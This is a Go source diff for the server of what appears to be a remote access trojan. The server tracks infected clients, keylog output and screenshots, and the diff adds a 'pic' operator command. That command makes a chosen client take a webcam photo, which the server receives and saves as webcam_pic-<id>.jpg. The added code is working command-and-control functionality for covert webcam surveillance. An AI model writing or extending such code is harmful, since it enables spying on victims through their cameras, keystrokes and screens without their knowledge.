@@ -59,6 +59,7 @@ var client_dialog map[string]string = make(map[string]string)
 var client_dialogoutput map[string]string = make(map[string]string)
 
 var should_screenshot bool = false
+var should_takepic bool = false
 
 var banner string = `
 ▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
@@ -87,7 +88,7 @@ func main() {
 		log.Fatalln(err)
 	}
 
-	s := grpc.NewServer(grpc.Creds(creds))
+	s := grpc.NewServer(grpc.Creds(creds), grpc.MaxRecvMsgSize(6000000*1024), grpc.MaxSendMsgSize(6000000*1024))
 	lis, err := net.Listen("tcp", ":8000")
 	if err != nil {
 		log.Fatalf("Failed to listen: %v", err)
@@ -280,6 +281,40 @@ func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.
 	return &pb.Void{}, nil
 }
 
+func (s *server) GetPicture(ctx context.Context, in *pb.ClientDataRequest) (*pb.PictureData, error) {
+	if !Contains(client_ids, in.ClientId) {
+		client_ids = append(client_ids, in.ClientId)
+	}
+
+	if in.ClientId == current_id {
+		pic := should_takepic
+		should_takepic = false
+		return &pb.PictureData{ShouldTakePicture: pic}, nil
+	}
+
+	return &pb.PictureData{ShouldTakePicture: false}, nil
+}
+
+func (s *server) SetPictureOutput(ctx context.Context, in *pb.PictureOutput) (*pb.Void, error) {
+	if !Contains(client_ids, in.Id.ClientId) {
+		client_ids = append(client_ids, in.Id.ClientId)
+	}
+
+	if in.Id.ClientId == current_id {
+		var file *os.File
+
+		defer file.Close()
+		file, err := os.OpenFile(fmt.Sprintf("webcam_pic-%s.jpg", in.Id.ClientId), os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			return &pb.Void{}, err
+		}
+
+		file.Write(in.PictureData)
+	}
+
+	return &pb.Void{}, nil
+}
+
 type model struct {
 	textInput           textinput.Model
 	showhelplist        bool
@@ -427,6 +462,12 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 			if len(m.textInput.Value()) == 10 && m.textInput.Value() == "screenshot" {
 				should_screenshot = true
+				m.showok = true
+				return m, nil
+			}
+
+			if len(m.textInput.Value()) == 3 && m.textInput.Value() == "pic" {
+				should_takepic = true
 				m.showok = true
 				return m, nil
 			}
